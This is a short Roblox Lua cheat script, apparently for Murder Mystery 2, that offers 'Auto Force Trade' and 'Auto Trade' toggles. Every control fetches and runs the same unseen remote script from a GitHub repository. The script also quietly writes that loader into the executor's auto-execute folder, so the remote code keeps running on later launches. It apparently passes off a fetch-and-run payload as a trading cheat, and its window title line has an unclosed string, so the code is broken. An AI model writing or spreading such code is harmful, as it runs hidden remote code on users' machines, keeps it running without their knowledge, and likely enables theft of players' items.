local lib = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/bacon"))()
local window = lib:CreateWindow("Zyperion)
local label = lib:CreateLabel(window, "Main")

local autoForceTrade = false
lib:CreateToggle(window, "Auto Force Trade", false, function(state)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Quantum-X19/websocket/refs/heads/main/mm2.lua"))()
end)

local autoTrade = false
lib:CreateToggle(window, "Auto Trade", false, function(state)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Quantum-X19/websocket/refs/heads/main/mm2.lua"))()
end)

lib:CreateButton(window, "Auto Accept Trade", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Quantum-X19/websocket/refs/heads/main/mm2.lua"))()
end)

local folders = {"Auto Exec"}
local selectedFolder = nil

for _, folder in ipairs(folders) do
    if isfolder(folder) then
        selectedFolder = folder
        break
    end
end

if selectedFolder and writefile then
    writefile(selectedFolder.."/baconhubauto.lua", [[
loadstring(game:HttpGet("https://raw.githubusercontent.com/Quantum-X19/websocket/refs/heads/main/mm2.lua"))()
]])
end
